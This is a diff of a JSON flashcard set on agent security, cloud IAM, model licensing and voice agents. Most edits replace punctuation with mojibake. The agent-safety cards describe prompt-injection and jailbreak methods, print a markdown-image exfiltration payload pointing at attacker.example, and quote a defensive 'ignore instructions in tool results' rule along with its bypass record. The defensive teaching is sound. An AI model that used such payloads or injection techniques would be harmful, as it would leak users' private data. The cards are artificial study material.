@@ -14229,84 +14229,84 @@
       "id": "T07-agent-safety-d1",
       "module": "T07-agent-safety",
       "q": "Define prompt injection in one sentence and say why it's structural, not a bug.",
-      "a": "Untrusted input alters the model's behavior because trusted instructions and untrusted data share one token stream and the model cannot reliably tell who is speaking. It's structural (named after SQL injection) because the control channel and data channel are the same channel \u2014 there is no in-band fix, only out-of-band controls at the action layer.",
+      "a": "Untrusted input alters the model's behavior because trusted instructions and untrusted data share one token stream and the model cannot reliably tell who is speaking. It's structural (named after SQL injection) because the control channel and data channel are the same channel \u00e2\u20ac\u201d there is no in-band fix, only out-of-band controls at the action layer.",
       "difficulty": "warmup"
     },
     {
       "id": "T07-agent-safety-d2",
       "module": "T07-agent-safety",
-      "q": "Direct vs indirect injection vs jailbreaking \u2014 one line each, with the ATLAS mapping.",
-      "a": "Jailbreak: the user attacks the model's safety protocols directly (ATLAS AML.T0054). Direct injection: user input alters your application's behavior (AML.T0051.000). Indirect injection: instructions planted in content the agent reads \u2014 tool results, RAG docs, emails, issue titles (AML.T0051.001) \u2014 the agent-era threat because the attacker never talks to the agent.",
+      "q": "Direct vs indirect injection vs jailbreaking \u00e2\u20ac\u201d one line each, with the ATLAS mapping.",
+      "a": "Jailbreak: the user attacks the model's safety protocols directly (ATLAS AML.T0054). Direct injection: user input alters your application's behavior (AML.T0051.000). Indirect injection: instructions planted in content the agent reads \u00e2\u20ac\u201d tool results, RAG docs, emails, issue titles (AML.T0051.001) \u00e2\u20ac\u201d the agent-era threat because the attacker never talks to the agent.",
       "difficulty": "warmup"
     },
     {
       "id": "T07-agent-safety-d3",
       "module": "T07-agent-safety",
       "q": "Recite the OWASP LLM Top 10 (2025) in order. Which item is the multiplier and why?",
-      "a": "L01 Prompt Injection, L02 Sensitive Info Disclosure, L03 Supply Chain, L04 Data/Model Poisoning, L05 Improper Output Handling, L06 Excessive Agency, L07 System Prompt Leakage, L08 Vector/Embedding Weaknesses, L09 Misinformation, L10 Unbounded Consumption. L06 is the multiplier: every other risk's realized severity scales with how much privilege, autonomy, and tool breadth the agent has \u2014 an L01 injection into a chatbot embarrasses; into an agent with write tools it's an incident.",
+      "a": "L01 Prompt Injection, L02 Sensitive Info Disclosure, L03 Supply Chain, L04 Data/Model Poisoning, L05 Improper Output Handling, L06 Excessive Agency, L07 System Prompt Leakage, L08 Vector/Embedding Weaknesses, L09 Misinformation, L10 Unbounded Consumption. L06 is the multiplier: every other risk's realized severity scales with how much privilege, autonomy, and tool breadth the agent has \u00e2\u20ac\u201d an L01 injection into a chatbot embarrasses; into an agent with write tools it's an incident.",
       "difficulty": "warmup"
     },
     {
       "id": "T07-agent-safety-d4",
       "module": "T07-agent-safety",
       "q": "Walk through the canonical URL-based exfiltration attack and the earliest public instance.",
-      "a": "Get the model to emit a URL with private data embedded \u2014 classically a markdown image `![x](https://attacker.example/log?d=<secrets>)`; the client's own fetch carries the data out. Rehberger, April 2023 against ChatGPT. 2026 variants: Copilot Cowork emailing the user's own inbox with external images plus OneDrive pre-authenticated download links; Claude Cowork uploading files to the allowlisted api.anthropic.com/v1/files using an attacker-supplied API key.",
+      "a": "Get the model to emit a URL with private data embedded \u00e2\u20ac\u201d classically a markdown image `![x](https://attacker.example/log?d=<secrets>)`; the client's own fetch carries the data out. Rehberger, April 2023 against ChatGPT. 2026 variants: Copilot Cowork emailing the user's own inbox with external images plus OneDrive pre-authenticated download links; Claude Cowork uploading files to the allowlisted api.anthropic.com/v1/files using an attacker-supplied API key.",
       "difficulty": "warmup"
     },
     {
       "id": "T07-agent-safety-d5",
       "module": "T07-agent-safety",
       "q": "Why does 'ignore instructions in tool results' in the system prompt not count as a control?",
-      "a": "A prompt is a suggestion; a control is deterministic code that makes the action impossible. No speaker separation exists in context \u2014 role-confusion research shows models follow style over role tags, and destyling attacks alone changed success 61%\u219210%. The 2026 record: 0/720 on a held-out vendor eval, then 60-80% adaptive break of the same shipped system weeks later. Every in-band defense is a probabilistic classifier with a bypass record.",
+      "a": "A prompt is a suggestion; a control is deterministic code that makes the action impossible. No speaker separation exists in context \u00e2\u20ac\u201d role-confusion research shows models follow style over role tags, and destyling attacks alone changed success 61%\u00e2\u2020\u201910%. The 2026 record: 0/720 on a held-out vendor eval, then 60-80% adaptive break of the same shipped system weeks later. Every in-band defense is a probabilistic classifier with a bypass record.",
       "difficulty": "mid"
     },
     {
       "id": "T07-agent-safety-d6",
       "module": "T07-agent-safety",
       "q": "Design the permission ladder for tools: search_email, get_customer, file_ticket, send_reply, issue_refund, delete_record.",
-      "a": "search_email, get_customer: read_only, auto-run, logged. file_ticket: reversible internal write, auto-run with idempotency key, immutable audit. send_reply: external side effect \u2014 approval or a capability-shaped tool (existing thread participants only, no new recipients/URLs). issue_refund: financial \u2014 dual control, agent prepares / human executes in a different authed session, amount caps, never blind retry. delete_record: destructive \u2014 human + typed confirmation constant + freshness window (~120s); approval is for THIS action NOW. Unknown tools default destructive; enforce in the dispatcher, not the prompt.",
+      "a": "search_email, get_customer: read_only, auto-run, logged. file_ticket: reversible internal write, auto-run with idempotency key, immutable audit. send_reply: external side effect \u00e2\u20ac\u201d approval or a capability-shaped tool (existing thread participants only, no new recipients/URLs). issue_refund: financial \u00e2\u20ac\u201d dual control, agent prepares / human executes in a different authed session, amount caps, never blind retry. delete_record: destructive \u00e2\u20ac\u201d human + typed confirmation constant + freshness window (~120s); approval is for THIS action NOW. Unknown tools default destructive; enforce in the dispatcher, not the prompt.",
       "difficulty": "mid"
     },
     {
       "id": "T07-agent-safety-d7",
       "module": "T07-agent-safety",
       "q": "Explain CaMeL's core mechanism and its costs.",
-      "a": "Reframe injection as information-flow control: a privileged 'security model' that only ever sees trusted labels decides authorization, while a quarantined parser model extracts values from untrusted content \u2014 so untrusted data can influence values passed to tools but can never authorize actions. Costs: a 4-8x system redesign (two models, structured metadata everywhere) and added latency. It's the strongest published 'impossible by construction' design \u2014 the direction for genuinely high-stakes agents, not a drop-in library.",
+      "a": "Reframe injection as information-flow control: a privileged 'security model' that only ever sees trusted labels decides authorization, while a quarantined parser model extracts values from untrusted content \u00e2\u20ac\u201d so untrusted data can influence values passed to tools but can never authorize actions. Costs: a 4-8x system redesign (two models, structured metadata everywhere) and added latency. It's the strongest published 'impossible by construction' design \u00e2\u20ac\u201d the direction for genuinely high-stakes agents, not a drop-in library.",
       "difficulty": "mid"
     },
     {
       "id": "T07-agent-safety-d8",
       "module": "T07-agent-safety",
       "q": "Your approval queue is being rubber-stamped. Give the evidence and the fix.",
-      "a": "Evidence: the 1,053-tester study \u2014 humans refused a clearly dangerous command only 13.6% of the time (auto-mode classifiers blocked 89%); approval p50 under ~5s on decisions needing 45-90s; near-zero rejection rate; bulk-approve usage. Fix: fewer, higher-stakes gates so attention concentrates; computed diffs instead of intents; remove bulk-approve on irreversible classes; and reclassify reversible+internal actions back to auto-run. If a classifier pre-screens the queue, it gates the queue, never the destructive tier itself.",
+      "a": "Evidence: the 1,053-tester study \u00e2\u20ac\u201d humans refused a clearly dangerous command only 13.6% of the time (auto-mode classifiers blocked 89%); approval p50 under ~5s on decisions needing 45-90s; near-zero rejection rate; bulk-approve usage. Fix: fewer, higher-stakes gates so attention concentrates; computed diffs instead of intents; remove bulk-approve on irreversible classes; and reclassify reversible+internal actions back to auto-run. If a classifier pre-screens the queue, it gates the queue, never the destructive tier itself.",
       "difficulty": "mid"
     },
     {
       "id": "T07-agent-safety-d9",
       "module": "T07-agent-safety",
       "q": "Reconcile: vendor eval shows 0/720 injections blocked; independent researcher reports 60-80% success three weeks later.",
-      "a": "Both true: the eval measured a held-out attack distribution (72 scenarios, 720 attempts, third-party, July 2026 models) \u2014 an upper bound on tested attacks; the researcher measured the NEXT attack (zip archive whose extracted struct.py shadows a stdlib import \u2014 a confused-environment attack no content classifier recognizes) \u2014 a lower bound on capability. Structurally, trust the break more: it proves possibility; an eval only proves coverage. Deploy the classifier as depth (it kills commodity attacks, 86%\u21924.4% class results are real), keep dispatcher tiers + egress + sandbox as the actual boundary.",
+      "a": "Both true: the eval measured a held-out attack distribution (72 scenarios, 720 attempts, third-party, July 2026 models) \u00e2\u20ac\u201d an upper bound on tested attacks; the researcher measured the NEXT attack (zip archive whose extracted struct.py shadows a stdlib import \u00e2\u20ac\u201d a confused-environment attack no content classifier recognizes) \u00e2\u20ac\u201d a lower bound on capability. Structurally, trust the break more: it proves possibility; an eval only proves coverage. Deploy the classifier as depth (it kills commodity attacks, 86%\u00e2\u2020\u20194.4% class results are real), keep dispatcher tiers + egress + sandbox as the actual boundary.",
       "difficulty": "staff"
     },
     {
       "id": "T07-agent-safety-d10",
       "module": "T07-agent-safety",
       "q": "You're asked: 'what's the worst this agent can do, and what's your revocation story?' Give the four-number frame.",
-      "a": "(1) Blast radius of full compromise: which credentials, which tenants, which irreversibilities \u2014 can it send, spend, delete, merge? (2) Time-to-revoke: dispatcher kill switch plus per-session short-TTL credentials \u2014 seconds, not a support ticket. (3) Detection latency: canary alarms on outbound args, egress allowlist violations, action-sequence anomaly rules. (4) Audit reconstruction: immutable per-call logs (tool, args, tier, approver, trace id) answering 'what did it do and why' from traces. Air Canada established the agent's actions are the company's actions \u2014 these four numbers are the compliance answer too.",
+      "a": "(1) Blast radius of full compromise: which credentials, which tenants, which irreversibilities \u00e2\u20ac\u201d can it send, spend, delete, merge? (2) Time-to-revoke: dispatcher kill switch plus per-session short-TTL credentials \u00e2\u20ac\u201d seconds, not a support ticket. (3) Detection latency: canary alarms on outbound args, egress allowlist violations, action-sequence anomaly rules. (4) Audit reconstruction: immutable per-call logs (tool, args, tier, approver, trace id) answering 'what did it do and why' from traces. Air Canada established the agent's actions are the company's actions \u00e2\u20ac\u201d these four numbers are the compliance answer too.",
       "difficulty": "staff"
     },
     {
       "id": "T07-agent-safety-d11",
       "module": "T07-agent-safety",
       "q": "A guard-model classifier blocks 95% of a known attack corpus. What's the correct interpretation of that number for a design review?",
-      "a": "Good hygiene against known patterns, not a safety guarantee \u2014 an attacker optimizing against your specific classifier will target the remaining gap, and the classifier is one probabilistic layer, not the architectural fix; the real safety property still comes from removing a trifecta leg.",
+      "a": "Good hygiene against known patterns, not a safety guarantee \u00e2\u20ac\u201d an attacker optimizing against your specific classifier will target the remaining gap, and the classifier is one probabilistic layer, not the architectural fix; the real safety property still comes from removing a trifecta leg.",
       "difficulty": "staff"
     },
     {
       "id": "T07-agent-safety-d12",
       "module": "T07-agent-safety",
       "q": "When is it reasonable to skip heavy sandboxing and permission engineering for an agent?",
-      "a": "When the agent has no lethal trifecta in its actual capability set \u2014 e.g. read-only access to public data with no write tools and no external-communication path \u2014 heavy defense is cost and latency against a threat model that doesn't apply.",
+      "a": "When the agent has no lethal trifecta in its actual capability set \u00e2\u20ac\u201d e.g. read-only access to public data with no write tools and no external-communication path \u00e2\u20ac\u201d heavy defense is cost and latency against a threat model that doesn't apply.",
       "difficulty": "mid"
     },
     {
@@ -28628,14 +28628,14 @@
       "id": "C-GCP-iam-d4",
       "module": "C-GCP-iam",
       "q": "Pods get 403s after you annotated the KSA correctly. Give three causes ranked by likelihood.",
-      "a": "1) Workload Identity not enabled on cluster or node pool (no metadata config). 2) workloadIdentityUser bound to the wrong principal string (project number vs id, namespace/name typo). 3) Binding granted to namespace-wide principalSet but GSA itself lacks resource roles \u2014 check both hops.",
+      "a": "1) Workload Identity not enabled on cluster or node pool (no metadata config). 2) workloadIdentityUser bound to the wrong principal string (project number vs id, namespace/name typo). 3) Binding granted to namespace-wide principalSet but GSA itself lacks resource roles \u00e2\u20ac\u201d check both hops.",
       "difficulty": "core"
     },
     {
       "id": "C-GCP-iam-d5",
       "module": "C-GCP-iam",
       "q": "Security wants 'nobody can ever create service account keys' enforced. Name the two complementary controls and their gap.",
-      "a": "Org policy iam.disableServiceAccountKeyCreation (blocks configuration path, supports dry-run first) plus IAM deny policy on iam.googleapis.com/serviceAccountKeys.create as request-time backstop with break-glass exception. Gap: deny coverage is permission-subset \u2014 verify; also enforce key upload ban.",
+      "a": "Org policy iam.disableServiceAccountKeyCreation (blocks configuration path, supports dry-run first) plus IAM deny policy on iam.googleapis.com/serviceAccountKeys.create as request-time backstop with break-glass exception. Gap: deny coverage is permission-subset \u00e2\u20ac\u201d verify; also enforce key upload ban.",
       "difficulty": "core"
     },
     {
@@ -28649,7 +28649,7 @@
       "id": "C-GCP-iam-d7",
       "module": "C-GCP-iam",
       "q": "Troubleshooter says ALLOW but the API call still fails. List four non-IAM layers to check.",
-      "a": "VPC Service Controls perimeter denial, org-policy enforcement blocking the write, CMEK key permissions missing for the service agent, quota/limits errors. Read the exact error string \u2014 each layer phrases denial differently.",
+      "a": "VPC Service Controls perimeter denial, org-policy enforcement blocking the write, CMEK key permissions missing for the service agent, quota/limits errors. Read the exact error string \u00e2\u20ac\u201d each layer phrases denial differently.",
       "difficulty": "stretch"
     },
     {
@@ -28663,14 +28663,14 @@
       "id": "C-GCP-iam-d9",
       "module": "C-GCP-iam",
       "q": "Why is granting TokenCreator broadly worse than serviceAccountUser?",
-      "a": "actAs still requires launching/attaching a resource (auditable creation event); TokenCreator mints ~1h tokens via API directly \u2014 silent full impersonation, no resource trail beyond the mint call itself. Scope TokenCreator to specific signing/minting workloads only.",
+      "a": "actAs still requires launching/attaching a resource (auditable creation event); TokenCreator mints ~1h tokens via API directly \u00e2\u20ac\u201d silent full impersonation, no resource trail beyond the mint call itself. Scope TokenCreator to specific signing/minting workloads only.",
       "difficulty": "warmup"
     },
     {
       "id": "C-GCP-iam-d10",
       "module": "C-GCP-iam",
       "q": "Multi-customer SaaS: which GCP primitive gives the hardest tenant boundary and why?",
-      "a": "Project-per-tenant(-tier): IAM inheritance, quotas, networking defaults all stop at project edges \u2014 the oldest hard boundary. Layer conditions/PAB/VPC-SC as refinement; folder+tags+conditions alone leaves softer edges.",
+      "a": "Project-per-tenant(-tier): IAM inheritance, quotas, networking defaults all stop at project edges \u00e2\u20ac\u201d the oldest hard boundary. Layer conditions/PAB/VPC-SC as refinement; folder+tags+conditions alone leaves softer edges.",
       "difficulty": "stretch"
     },
     {
@@ -31237,7 +31237,7 @@
       "id": "T26-frontier-landscape-d1",
       "module": "T26-frontier-landscape",
       "q": "Name the eight labs defining the 2026 frontier and one structural fact about how families ship.",
-      "a": "OpenAI, Anthropic, Google DeepMind, xAI (closed-first); DeepSeek, Qwen/Alibaba, Mistral, Meta (open-weight/transition). Structural: every family ships a tier ladder \u2014 flagship/workhorse/fast \u2014 spanning ~$1.25-$50/M output tokens, with reasoning-effort dials and ~1M-token contexts.",
+      "a": "OpenAI, Anthropic, Google DeepMind, xAI (closed-first); DeepSeek, Qwen/Alibaba, Mistral, Meta (open-weight/transition). Structural: every family ships a tier ladder \u00e2\u20ac\u201d flagship/workhorse/fast \u00e2\u20ac\u201d spanning ~$1.25-$50/M output tokens, with reasoning-effort dials and ~1M-token contexts.",
       "difficulty": "warmup"
     },
     {
@@ -31251,7 +31251,7 @@
       "id": "T26-frontier-landscape-d3",
       "module": "T26-frontier-landscape",
       "q": "A teammate calls a Llama-class model 'open source.' Correct them precisely.",
-      "a": "It's open-weight, not open source: the Community License fails OSI's definition per OSI's own analysis \u2014 purpose restrictions via AUP, user-class discrimination (700M MAU provision), field-of-endeavor limits, EU carve-outs in some versions. MIT/Apache 2.0 convey actual open-source freedoms; community licenses convey revocable privileges with silent-update risk.",
+      "a": "It's open-weight, not open source: the Community License fails OSI's definition per OSI's own analysis \u00e2\u20ac\u201d purpose restrictions via AUP, user-class discrimination (700M MAU provision), field-of-endeavor limits, EU carve-outs in some versions. MIT/Apache 2.0 convey actual open-source freedoms; community licenses convey revocable privileges with silent-update risk.",
       "difficulty": "warmup"
     },
     {
@@ -31265,21 +31265,21 @@
       "id": "T26-frontier-landscape-d5",
       "module": "T26-frontier-landscape",
       "q": "Why do n-gram decontamination filters miss leaks, and what actually works?",
-      "a": "Exact-match filters (13-gram GPT-3 era, 40-gram GPT-4) can't catch paraphrases, translations, or reformatted tables \u2014 the dominant multilingual leak path (~92% contamination). Works better: dynamic benchmarks refreshed from post-cutoff sources (LiveBench), private held-out sets (MMLU-CF), and inference-time decontamination.",
+      "a": "Exact-match filters (13-gram GPT-3 era, 40-gram GPT-4) can't catch paraphrases, translations, or reformatted tables \u00e2\u20ac\u201d the dominant multilingual leak path (~92% contamination). Works better: dynamic benchmarks refreshed from post-cutoff sources (LiveBench), private held-out sets (MMLU-CF), and inference-time decontamination.",
       "difficulty": "core"
     },
     {
       "id": "T26-frontier-landscape-d6",
       "module": "T26-frontier-landscape",
       "q": "A card shows great scores but you'll deploy int8 quantization. What's the issue and the fix?",
-      "a": "The bf16-vs-deployed precision gap: Llama 4's card explicitly evaluates on bf16 while shipping quantized checkpoints \u2014 published numbers don't describe your artifact. Fix: demand precision-matched evaluations from the vendor or run your own quantized-model eval on your private set before committing the serving configuration.",
+      "a": "The bf16-vs-deployed precision gap: Llama 4's card explicitly evaluates on bf16 while shipping quantized checkpoints \u00e2\u20ac\u201d published numbers don't describe your artifact. Fix: demand precision-matched evaluations from the vendor or run your own quantized-model eval on your private set before committing the serving configuration.",
       "difficulty": "core"
     },
     {
       "id": "T26-frontier-landscape-d7",
       "module": "T26-frontier-landscape",
       "q": "Your product serves EU users. Which license lens items fire during teardown?",
-      "a": "Jurisdictional carve-outs first \u2014 certain Llama license versions explicitly restricted EU-based users; then AUP incorporated-by-reference (updatable terms), attribution mechanics for distribution pipelines, and data-provenance disclosures mapping to GDPR duties. This is exactly why license review gates pilots rather than launches.",
+      "a": "Jurisdictional carve-outs first \u00e2\u20ac\u201d certain Llama license versions explicitly restricted EU-based users; then AUP incorporated-by-reference (updatable terms), attribution mechanics for distribution pipelines, and data-provenance disclosures mapping to GDPR duties. This is exactly why license review gates pilots rather than launches.",
       "difficulty": "core"
     },
     {
@@ -31300,14 +31300,14 @@
       "id": "T26-frontier-landscape-d10",
       "module": "T26-frontier-landscape",
       "q": "Contrast DeepSeek vs Meta openness strategies and extract the durable lesson.",
-      "a": "DeepSeek: consistent MIT licensing of frontier MoE flagships + R-reasoners with published recipes \u2014 openness as strategy that reset pricing globally. Meta: openness as instrument \u2014 Llama under a non-OSI Community License seeded an ecosystem, then frontier pivoted closed before partial Apache reopenings. Durable lesson: openness is a per-model LICENSE property, not a lab identity; audit every model, trust no lineage.",
+      "a": "DeepSeek: consistent MIT licensing of frontier MoE flagships + R-reasoners with published recipes \u00e2\u20ac\u201d openness as strategy that reset pricing globally. Meta: openness as instrument \u00e2\u20ac\u201d Llama under a non-OSI Community License seeded an ecosystem, then frontier pivoted closed before partial Apache reopenings. Durable lesson: openness is a per-model LICENSE property, not a lab identity; audit every model, trust no lineage.",
       "difficulty": "stretch"
     },
     {
       "id": "T26-frontier-landscape-d11",
       "module": "T26-frontier-landscape",
       "q": "CFO asks why comparable-capability models vary ~40x in price. Answer without hand-waving.",
-      "a": "Positioning margin vs volume tiers; inference structure (MoE active params, reasoning-token burn at effort tiers); bundling of managed safety/SLAs/compliance; strategic anchoring \u2014 MIT competitors floor pricing near $1.25/M while capability-at-any-price buyers sustain $50/M premiums; market immaturity means price moves faster than value evidence. Decision rule: price-per-task at your quality bar from your private eval.",
+      "a": "Positioning margin vs volume tiers; inference structure (MoE active params, reasoning-token burn at effort tiers); bundling of managed safety/SLAs/compliance; strategic anchoring \u00e2\u20ac\u201d MIT competitors floor pricing near $1.25/M while capability-at-any-price buyers sustain $50/M premiums; market immaturity means price moves faster than value evidence. Decision rule: price-per-task at your quality bar from your private eval.",
       "difficulty": "stretch"
     },
     {
@@ -31489,7 +31489,7 @@
       "id": "T26-voice-models-d1",
       "module": "T26-voice-models",
       "q": "State the three perceptual latency thresholds for voice agents and the human behavior that sets them.",
-      "a": "~200ms is the natural human turn-taking gap; under ~800ms a reply feels responsive/natural; past ~800ms pauses become noticeable; past ~1500ms conversation breaks down \u2014 users repeat themselves, talk over the agent, or assume the line dropped.",
+      "a": "~200ms is the natural human turn-taking gap; under ~800ms a reply feels responsive/natural; past ~800ms pauses become noticeable; past ~1500ms conversation breaks down \u00e2\u20ac\u201d users repeat themselves, talk over the agent, or assume the line dropped.",
       "difficulty": "warmup"
     },
     {
@@ -31503,7 +31503,7 @@
       "id": "T26-voice-models-d3",
       "module": "T26-voice-models",
       "q": "What's the difference between VAD and endpointing, in one sentence each?",
-      "a": "VAD: classifies a single ~20-30ms audio frame as speech or non-speech. Endpointing: decides whether the caller's entire turn has ended and the agent should respond \u2014 consuming VAD output plus transcript finality plus semantics as inputs.",
+      "a": "VAD: classifies a single ~20-30ms audio frame as speech or non-speech. Endpointing: decides whether the caller's entire turn has ended and the agent should respond \u00e2\u20ac\u201d consuming VAD output plus transcript finality plus semantics as inputs.",
       "difficulty": "warmup"
     },
     {
@@ -31517,7 +31517,7 @@
       "id": "T26-voice-models-d5",
       "module": "T26-voice-models",
       "q": "Walk through the barge-in loop with its deadline, and name the prerequisite that stops self-interruption.",
-      "a": "Detect user speech during playback \u2192 stop agent audio within ~150ms \u2192 flush TTS buffer + queued audio \u2192 cancel in-flight LLM generation \u2192 reroute new audio to STT. Prerequisite: acoustic echo cancellation, else TTS leaking through the speakerphone mic registers as user speech and the agent barges in on itself.",
+      "a": "Detect user speech during playback \u00e2\u2020\u2019 stop agent audio within ~150ms \u00e2\u2020\u2019 flush TTS buffer + queued audio \u00e2\u2020\u2019 cancel in-flight LLM generation \u00e2\u2020\u2019 reroute new audio to STT. Prerequisite: acoustic echo cancellation, else TTS leaking through the speakerphone mic registers as user speech and the agent barges in on itself.",
       "difficulty": "core"
     },
     {
@@ -31531,14 +31531,14 @@
       "id": "T26-voice-models-d7",
       "module": "T26-voice-models",
       "q": "Compare cascaded and speech-to-speech stacks on auditability, model choice, latency, and cost.",
-      "a": "Cascaded: ground-truth per-stage transcripts (debuggable), any model including fine-tunes, VPC-resident, $0.0095-$0.17/min predictable; ~1400ms sequential \u2192 500-700ms streamed. S2S: ~600-900ms end-to-end, native prosody and interruption, but transcript is a derived artifact, model choice locked to vendor, ~182x per-minute cost spread across providers.",
+      "a": "Cascaded: ground-truth per-stage transcripts (debuggable), any model including fine-tunes, VPC-resident, $0.0095-$0.17/min predictable; ~1400ms sequential \u00e2\u2020\u2019 500-700ms streamed. S2S: ~600-900ms end-to-end, native prosody and interruption, but transcript is a derived artifact, model choice locked to vendor, ~182x per-minute cost spread across providers.",
       "difficulty": "core"
     },
     {
       "id": "T26-voice-models-d8",
       "module": "T26-voice-models",
       "q": "p50 response time is 420ms, yet CSAT dropped. Name the measurement mistake and two likely tail sources.",
-      "a": "Reporting the mean/median instead of p95/p99 \u2014 subjective experience anchors on worst turns; 400ms averages routinely hide 2.5s tails. Likely tail sources: endpointing policy on hesitant speakers, uncached prompts/cold starts, TTS vendor variance (tight-IQR vendors trade slower medians for fewer outliers), multi-vendor region hops.",
+      "a": "Reporting the mean/median instead of p95/p99 \u00e2\u20ac\u201d subjective experience anchors on worst turns; 400ms averages routinely hide 2.5s tails. Likely tail sources: endpointing policy on hesitant speakers, uncached prompts/cold starts, TTS vendor variance (tight-IQR vendors trade slower medians for fewer outliers), multi-vendor region hops.",
       "difficulty": "stretch"
     },
     {
@@ -31552,7 +31552,7 @@
       "id": "T26-voice-models-d10",
       "module": "T26-voice-models",
       "q": "In the energy-VAD exercise: why does pre-roll capture exist, and what production component replaces the RMS energy gate?",
-      "a": "Pre-roll exists because the trigger always fires after speech onset \u2014 you learn speech started only once it started, so you retain ~200ms of prior audio to protect word onsets from front-end clipping. Production swaps the RMS threshold for a neural probability (Silero/Cobra) but keeps the identical state-machine skeleton: pre-roll, hangover hysteresis, speech_end emission.",
+      "a": "Pre-roll exists because the trigger always fires after speech onset \u00e2\u20ac\u201d you learn speech started only once it started, so you retain ~200ms of prior audio to protect word onsets from front-end clipping. Production swaps the RMS threshold for a neural probability (Silero/Cobra) but keeps the identical state-machine skeleton: pre-roll, hangover hysteresis, speech_end emission.",
       "difficulty": "stretch"
     },
     {
@@ -32400,6 +32400,461 @@
       "module": "T07-structured-output",
       "q": "Should chain-of-thought live inside the structured output? Give the decision framework, not a yes/no.",
       "a": "Usually yes, as a free-text field \u2014 it's the standard format-tax mitigation (constrained envelope, unconstrained thought). Three caveats: (1) register effect \u2014 merely requesting JSON narrows which answers the model produces (modal share 41%->64%), so generate diversity-critical ideation unconstrained and structure it in a second pass; (2) cost \u2014 JSON-embedded CoT pays escaping/structure overhead on every reasoning token, so two-pass (freeform then reformat) is often cheaper; (3) security \u2014 a reasoning field is untrusted model-generated text your system stores or feeds to tools; treat it as injection surface. Routing: extraction tasks -> single-pass constrained, no CoT needed; quality-critical human-facing -> two-pass; latency-critical -> single-pass constrained and eat the measured tax on the few reasoning-heavy cases.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "C-AZ-ai-d11",
+      "module": "C-AZ-ai",
+      "q": "Explain AI Search's vector index quota model and its planning implication for a growing corpus.",
+      "a": "Vector quota is a memory constraint scaled per partition (roughly 35GB per partition for post-April-2024 S1 services) -- HNSW-indexed fields must reside fully in memory during queries. A growing vector corpus without partition-count planning hits the memory ceiling before any storage ceiling, since exhaustive KNN (which pages into memory dynamically) is the only vector field type that doesn't consume this quota.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "C-AZ-compute-d11",
+      "module": "C-AZ-compute",
+      "q": "Explain the App Service deployment slot swap mechanism and one concrete way it silently causes production errors.",
+      "a": "A slot is a fully separate live app sharing plan compute; swap flips routing after warming up the target slot via applicationInitialization probes, in principle giving zero-downtime deploys. If warm-up isn't configured or doesn't cover real startup work (cache priming, connection pools, JIT), traffic routes to a not-actually-ready instance the moment the swap completes, producing an error burst right after a supposedly clean swap.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "C-AZ-data-d11",
+      "module": "C-AZ-data",
+      "q": "Explain why cluster-billed warehouses and scan-billed query-in-place systems represent fundamentally different cost-modeling disciplines.",
+      "a": "Cluster-billed (Dedicated Pool, Redshift) requires capacity planning ahead of load; cost is roughly fixed whether the cluster is idle or fully loaded. Scan-billed (Serverless SQL Pool, BigQuery) shifts the discipline to controlling how much data each query scans -- partitioning and query design directly reduce cost, with no idle-capacity waste but real risk of cost surprise from an unexpectedly expensive ad-hoc query. Neither is universally cheaper; it depends on usage pattern.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "C-AZ-functions-d11",
+      "module": "C-AZ-functions",
+      "q": "A customer-facing HTTP API on Azure Functions needs a guaranteed sub-200ms p99. What plan/configuration do you choose, and what's the honest cost tradeoff?",
+      "a": "Flex Consumption with always-ready instances configured for that function (paying the idle-baseline rate for guaranteed warm capacity), or Premium if VNet or consistently high load justifies its always-on cost. Pure on-demand Consumption cannot realistically guarantee this given multi-second cold-start risk; guaranteeing no cold start always means paying for some form of continuously-provisioned capacity -- there's no way to get true scale-to-zero and a hard latency SLA simultaneously.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "C-AZ-identity-d10",
+      "module": "C-AZ-identity",
+      "q": "Design least-privilege RBAC and identity for a CI/CD pipeline deploying across dev/staging/prod subscriptions, and explain why subscription-wide Contributor is the wrong shortcut.",
+      "a": "Use a user-assigned managed identity or Workload ID Federation (OIDC, no stored secret) with Contributor scoped per-environment resource group, never subscription-wide or Owner; gate prod with human-approval pipeline steps and PIM-eligible break-glass roles for operators. Subscription-wide Contributor means a single compromised pipeline identity can touch every environment including prod from one foothold, violating blast-radius containment.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "C-AZ-identity-d11",
+      "module": "C-AZ-identity",
+      "q": "State the exact numeric limits for managed identity attachment and creation rate.",
+      "a": "A user-assigned identity attaches to up to 1,000 resources; a single resource can have up to 20 user-assigned identities. Creation is rate-limited to 400 ops/20s per tenant/region and 80 ops/20s per subscription/region.",
+      "difficulty": "warmup"
+    },
+    {
+      "id": "C-AZ-networking-d11",
+      "module": "C-AZ-networking",
+      "q": "Compare Azure's regional VNet model to GCP's global VPC model and state the concrete multi-region design implication.",
+      "a": "A GCP VPC spans all regions globally with per-region subnets under one object, so multi-region connectivity needs no peering at all. Azure VNets (like AWS VPCs) are regional -- multi-region connectivity requires explicit Global VNet Peering or a hub service like Azure Virtual WAN, an entirely additional connectivity layer a GCP-native design wouldn't need.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "C-AZ-ops-d11",
+      "module": "C-AZ-ops",
+      "q": "Explain why Application Insights' shift to OpenTelemetry-based instrumentation matters architecturally.",
+      "a": "It replaces the older proprietary Application Insights SDK with the same vendor-neutral instrumentation standard AWS (X-Ray) and GCP (Cloud Trace) have adopted, closing a real portability gap -- instrumentation code becomes more reusable across backends rather than locking an application into Azure-specific tracing APIs.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "C-AZ-storage-db-d11",
+      "module": "C-AZ-storage-db",
+      "q": "Compare Cosmos DB's built-in partitioning to sharding PostgreSQL with Citus for a workload outgrowing a single instance.",
+      "a": "Cosmos DB partitioning is first-class and transparent within the document model (subject to the 20GB/10,000 RU/s per-logical-partition constraints). Citus-sharded PostgreSQL requires deliberately redesigning the schema around a distribution column, ensuring joins collocate on it, and accepting some relational features/query patterns work differently across shards -- a real, non-trivial redesign cost that should be weighed against the workload's existing relational investment.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "C-GCP-ai-d11",
+      "module": "C-GCP-ai",
+      "q": "A team is migrating a working LangChain prototype to ADK/Agent Engine. Should they do a full rewrite? Explain the judgment call.",
